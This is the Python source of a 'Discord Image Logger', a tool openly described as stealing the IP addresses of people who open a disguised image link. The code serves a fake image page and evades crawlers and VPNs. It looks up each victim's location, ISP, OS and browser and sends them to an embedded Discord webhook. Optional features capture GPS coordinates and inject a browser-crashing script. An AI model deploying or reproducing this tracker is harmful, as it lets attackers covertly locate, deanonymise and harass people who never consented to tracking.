# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1336736945719738378/h84057JjB9v6aaN-GP6RLWoXDDqc2ph4tUj8GSP58FtL7m_Dg2073SmIxp5I6JLdoruO",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
